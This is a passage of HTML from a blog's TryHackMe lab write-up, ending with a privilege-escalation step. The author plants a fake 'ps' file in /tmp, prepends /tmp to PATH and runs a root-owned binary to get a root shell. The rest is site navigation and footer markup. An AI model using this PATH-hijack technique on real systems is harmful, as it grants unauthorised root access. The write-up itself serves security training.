+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/21.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>the exe.c file on user kel’s home directory shows that we are calling the ps system command. The program will search the ps command in the directories of the PATH variable. We can print out the PATH variables for the kel user as follows</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kel@THM_exploit:~$ <span class="nb">echo</span> <span class="nv">$PATH</span>  
+</span></span><span class="line"><span class="cl">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:~$
+</span></span></code></pre></div><p>We can stage our attack as follows - Create our own ps file that spawns a shell and add it to the beginning of $PATH. So when we run the exec binary, we get a shell as root</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kel@THM_exploit:~$ <span class="nb">cd</span> /tmp  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ <span class="nb">echo</span> “/bin/bash” &gt; ps  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ chmod <span class="m">777</span> ps  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ <span class="nb">echo</span> <span class="nv">$PATH</span>  
+</span></span><span class="line"><span class="cl">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ <span class="nb">cd</span>  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:~$ ./exe   
+</span></span><span class="line"><span class="cl">root@THM_exploit:~#<span class="sb">`</span>
+</span></span></code></pre></div><p>We get root !</p>
+
+      </div>
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group" href="/posts/2021-03-28_tryhackme-brainstorm/">
+              <span
+                class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >TryhackMe -BrainStorm</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2021-03-28 15:51:16.293 &#43;0000 UTC">28 March 2021</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group" href="/posts/2021-04-05_brainpantryhackme/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >BrainPan-Tryhackme</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2021-04-05 18:46:03.757 &#43;0000 UTC">5 April 2021</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    </footer>
+    
+  </article>
+
+        
+          <div
+            class="absolute top-[110vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"
+          >
+            <a
+              href="#the-top"
+              class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main>
+      <div
+  id="search-wrapper"
+  class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible"
+  data-url="https://trevorsaudi.com/"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+<footer class="py-10 print:hidden">
+  
+  
+  <div class="flex justify-between">
+    <div>
+      
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          😄
+      </p>
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://git.io/hugo-congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    
+    
+      <div
+        class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"
+      >
+        <button
+          id="appearance-switcher"
+          class="w-12 h-12 "
+          type="button"
+          title="Switch to dark appearance"
+        >
+          <span class="inline dark:hidden">
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+</span>
+          <span class="hidden dark:inline">
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+</span>
+        </button>
+      </div>
+    
+  </div>
+  
+  
+</footer>
+</div>
+  </body>
+</html>
